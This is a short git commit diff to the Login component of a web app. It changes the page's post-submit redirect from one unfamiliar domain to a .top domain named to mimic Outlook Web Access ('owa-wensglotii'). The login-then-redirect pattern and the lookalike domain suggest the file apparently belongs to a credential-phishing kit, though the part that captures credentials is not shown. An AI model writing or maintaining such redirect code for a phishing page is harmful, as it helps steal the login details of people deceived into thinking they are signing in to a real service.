9f05e831c753e88ddaa9ed55fb85870ff7c8ca02
husknet <127146284+husknet@users.noreply.github.com>
2025-03-26 12:24:08 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://kr.ca-abb.com/';
+      window.location.href = 'https://kar.tbint.owa-wensglotii.top/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
